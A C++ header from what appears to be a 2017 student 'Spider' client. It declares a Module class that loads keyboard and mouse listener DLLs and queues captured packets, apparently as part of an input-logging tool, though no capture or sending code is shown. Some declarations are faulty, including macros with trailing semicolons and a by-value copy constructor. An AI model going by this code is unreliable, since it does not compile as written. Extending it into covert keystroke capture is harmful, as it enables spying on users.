//
// Created by lavigne on 10/5/17.
//

#ifndef MODULE_HPP
#define MODULE_HPP

#define OP_KEYBOARD 0x01;
#define OP_MOUSE 0x02;

# include <glob.h>
# include <windows.h>
# include "client/SpiderClient.hpp"

class   Module
{
    std::string _filenameListener;
    char _opcode;
    IListener* _listener;
    HINSTANCE _dll;
public:
    /* Constr & Destr*/
    Module(char opcode, std::string filenameListener);
    Module();
    Module(Module copy);
    Module& operator=(Module copy);
    virtual ~Module();

    /*Getters & Setters*/
    char    getOpcode() const; // identifier module
    void    setOpcode(char op);

    /* Doing */
    void    addNextData(t_paquet *); //
    size_t  getDataSize();
    std::string getFilenameOutput();
    void    run();
    int loadListener();
    int unloadListener();
    void load(char opcode);
};



#endif //MODULE_HPP